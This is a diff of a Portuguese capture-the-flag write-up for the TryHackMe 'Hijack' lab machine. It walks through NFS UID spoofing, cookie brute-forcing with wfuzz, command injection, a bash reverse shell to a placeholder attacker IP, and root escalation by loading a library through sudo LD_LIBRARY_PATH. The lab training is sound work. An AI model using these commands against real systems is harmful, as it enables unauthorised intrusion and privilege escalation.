@@ -1,12 +1,50 @@
-# TryHackMe - Hijack
+<div align="center">
 
-**Categoria:** Linux | Web  
-**Dificuldade:** Easy  
-**Tempo estimado:** 120 min  
+# 🚀 TryHackMe – Hijack (Writeup)
+
+*"Se você pode sequestrar, você pode possuir."* 🕶️💻  
+
+<p align="center">
+  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=22&pause=1000&color=00FF00&width=600&lines=Linux+Exploitation;Web+Exploitation;Privilege+Escalation;NFS+Abuse;CTF+Walkthrough" alt="Typing SVG" />
+</p>
+
+</div>
+
+---
+<div align="center">
+
+## 📌 Informações da Máquina
+
+- **Categoria:** Linux | Web  
+- **Dificuldade:** 🟢 Easy  
+- **Tempo Estimado:** ⏱️ 120 min  
+- **Status:** ✅ Rooted com sucesso  
+
+</div>
+
+---
+<div align="center">
+    
+## 🗺️ Roadmap da Exploração
+
+</div>
+
+```mermaid
+graph TD
+A[Enumeração Inicial] --> B[NFS Enum]
+B --> C[FTP Loot]
+C --> D[Wordlist + Cookie Brute]
+D --> E[Command Injection]
+E --> F[Reverse Shell www-data]
+F --> G[Credenciais Rick via config.php]
+G --> H[SSH Rick]
+H --> I[Sudo Abuse + LD_LIBRARY_PATH]
+I --> J[Root Shell + Flags]
+```
 
 ---
 
-## 1. Enumeração inicial
+## 🔍 Enumeração Inicial
 
 Primeiro, testei conectividade:
 
@@ -17,7 +55,7 @@ ping -c 3 $ALVO | grep -o "=64"
 =64
 ````
 
-Enumeração com Nmap:
+Scan de portas e serviços:
 
 ```bash
 nmap -A $ALVO
@@ -32,7 +70,7 @@ nmap -A $ALVO
 
 ---
 
-## 2. Enumeração do NFS
+## 📂 Exploração do NFS
 
 ```bash
 showmount -e $ALVO
@@ -44,14 +82,12 @@ Output:
 /mnt/share *
 ```
 
-Monte o diretório:
-
+Monte o share:
 ```bash
 mount -t nfs $ALVO:/mnt/share share
 ```
 
-Pasta com UID/GID **1003**. Para acessar, fiz spoofing:
-
+UID/GID esperado: **1003**
 ```bash
 useradd hijack
 usermod -u 1003 hijack
@@ -60,41 +96,40 @@ su hijack
 ```
 
 Dentro do share:
-
 ```bash
 ls
 for_employees.txt
 cat for_employees.txt
 ```
 
-Credenciais encontradas:
-
+📌 Credenciais encontradas:  
 ```
 ftpuser:W3stV1rg1n14M0un741nM4m4
 ```
 
 ---
 
-## 3. FTP
+## 📡 FTP
 
 Acesso ao FTP com sucesso:
-
 ```bash
 ftp $ALVO
 ```
 
 Arquivos encontrados:
-
 * `-rw-r--r--  1 root root    368 Aug 19 01:30 .from_admin.txt` → admin informa que todos usam senhas de uma wordlist segura.
 * `-rw-r--r--  1 root root   3150 Aug 19 01:30 .passwords_list.txtt` → lista com **senhas**.
 
-cat .from_admin.txt 
+```bash
+$cat .from_admin.txt
+
 To all employees, this is "admin" speaking,
 i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.
 
 NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
 
-wc -l .passwords_list.txt && echo "" && head -n 10 .passwords_list.txt 
+$
+$wc -l .passwords_list.txt && echo "" && head -n 10 .passwords_list.txt 
 150 .passwords_list.txt
 
 Vxb38mSNN8wxqHxv6uMX
@@ -107,33 +142,23 @@ kfFpLAQFhD3S6TvYn4mv
 nYyn4JxPhjSsm4HUeGtK
 yGWCg6GNePUFZzV8f2gP
 LFK43GAfc8JeVpCGCXzM
+```
 
 ---
 
-## 4. Força bruta de sessão admin
+## 🍪 Brute-force de Sessão (Admin)
 
-agora vamos criar um usuário e pegar o cookie para fazermos força bruta com uma dessas senhas no admin e rick
-
-Cookie
-PHPSESSID=aGlqYWNrOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl; PHPSESSID=p2cm0p1sig3b5ahhscrtlan301
-
-cyber chief
-from base64
-
-input:
-aGlqYWNrOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl
-
-output:
-hijack:e10adc3949ba59abbe56e057f20f883e
-
-temos username:hash como padrão e MD5 como hash
-
+Cookie padrão em uso → formato:  
 ```
 base64(usuario:md5(senha))
 ```
 
-Script para gerar wordlist:
+Decodificação do cookie com CyberChief:  
+```
+hijack:e10adc3949ba59abbe56e057f20f883e
+```
 
+Script para gerar wordlist:
 ```python
 import hashlib
 import base64
@@ -167,10 +192,8 @@ python3 bruteforce.py > cookies.txt
 ```
 
 Brute-force com wfuzz:
-
 ```bash
-wfuzz -u http://$ALVO/administration.php -w cookies.txt -X POST -b 'PHPSESSID=FUZZ' --hh 51
-```
+$wfuzz -u http://$ALVO/administration.php -w cookies.txt -X POST -b 'PHPSESSID=FUZZ' --hh 51
 
 Total requests: 150
 
@@ -181,11 +204,13 @@ ID           Response   Lines    Word     Chars       Payload
 000000082:   200        42 L     66 W     864 Ch      "YWRtaW46ZDY1NzNlZDczOW
                                                       FlN2ZkZmIzY2VkMTk3ZDk0O
                                                       DIwYTU="
+```
+
+🎯 Cookie válido encontrado → acesso ao painel como **admin**.  
+
 ---
 
-copie o cookie, cole no cookie atual seu e F5
-
-## 5. Command Injection no painel
+## 💣 Command Injection
 
 No painel, havia o **Service Status Checker**.
 Teste de injection:
@@ -195,21 +220,18 @@ Teste de injection:
 ```
 
 Output:
-
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 Reverse shell (como `nc` não estava instalado, usei bash):
-
 ```bash
 $(bash -c 'bash -i >& /dev/tcp/ATAQUE_IP/1234 0>&1')
 ```
 
 Listener:
-
 ```bash
-root@ip-10-201-84-21:~# nc -lvnp 1234
+$nc -lvnp 1234
 Listening on 0.0.0.0 1234
 Connection received on 10.201.6.151 36206
 bash: cannot set terminal process group (1250): Inappropriate ioctl for device
@@ -236,7 +258,7 @@ if ($mysqli->connect_error) {
 
 ---
 
-## 6. Escalada para rick
+## 🔑 Escalada para rick
 
 Dentro do webroot:
 
@@ -252,55 +274,37 @@ $password = "N3v3rG0nn4G1v3Y0uUp";
 ```
 
 SSH com sucesso:
-
 ```bash
 ssh rick@$ALVO
 ```
 
 ---
 
-## 7. Flag de usuário
+## 👤 Flag de Usuário
 
 ```bash
 $ ls
 user.txt
 $ 
 $ cat user.txt
-THM{fdc8cd4cff2c19e0d1022e78481ddf36}
-$ 
-$ sudo -l
-[sudo] password for rick: 
-Matching Defaults entries for rick on Hijack:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    env_keep+=LD_LIBRARY_PATH
-
-User rick may run the following commands on Hijack:
-    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
-$ 
-
-O usuário rick pode rodar /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2 como root sem senha, mas precisamos definir uma variável de ambiente declarada ao LD_LYBRARY_PATH que compartilha biblioteca com Apache
+THM{***********************}
 ```
 
 ---
 
-## 8. Escalada para root
+## ⚡ Escalada de Privilégio
 
-Verificando sudo:
-
+Verificando sudo:  
 ```bash
 sudo -l
 ```
 
-Output:
-
+Permissão especial:  
 ```
-User rick may run the following commands on Hijack:
-    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+rick pode rodar /usr/sbin/apache2 com LD_LIBRARY_PATH preservado
 ```
 
-O sudo preserva `LD_LIBRARY_PATH`.
-Listando libs do apache:
+Apache depende de `libcrypt.so.1`.  
 
 ```bash
 ldd /usr/sbin/apache2
@@ -351,8 +355,9 @@ Root shell obtida ✅
 
 ---
 
-## 9. Flag root
+## 👑 Flag Root
 
+```bash
 $ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
 [sudo] password for rick: 
 /usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
@@ -367,17 +372,39 @@ root@Hijack:/# cd /root/
 root@Hijack:/root# ls
 root.txt
 root@Hijack:/root# cat root.txt
-THM{b91ea3e8285157eaf173d88d0a73ed5a}
+THM{***********************}
+```
 
 ---
 
-## 10. Conclusão
+## 🧩 Fluxo Final
 
-Fluxo completo:
+1. NFS aberto → spoof de UID/GID.  
+2. FTP com credenciais → wordlist segura do admin.  
+3. Cookie `PHPSESSID` → brute-force com wordlist.  
+4. Command Injection → shell como www-data.  
+5. Credenciais no `config.php` → SSH rick.  
+6. Sudo abuse (`LD_LIBRARY_PATH`) → root.  
 
-1. NFS aberto → spoof de UID
-2. Credenciais FTP → wordlist de senhas
-3. Cookie PHPSESSID com hash MD5 → brute-force admin
-4. Command Injection no painel → shell www-data
-5. Credenciais em config.php → SSH rick
-6. `sudo -l` + Apache + LD\_LIBRARY\_PATH → root
+---
+
+## 🎉 Conclusão
+
+Essa box foi um combo 🔥 de técnicas:  
+- Exploração de **NFS mal configurado**  
+- Senhas compartilhadas em FTP  
+- **Cookies fracos** base64+MD5  
+- Command Injection web clássico  
+- Escalada de privilégios via **LD_LIBRARY_PATH** abuse  
+
+💡 Ótima máquina para reforçar exploração de **Linux + Web**!  
+
+---
+
+<div align="center">
+
+![Snake animation](https://github.com/Platane/snk/raw/output/github-contribution-grid-snake.svg)
+
+</div>
+
+
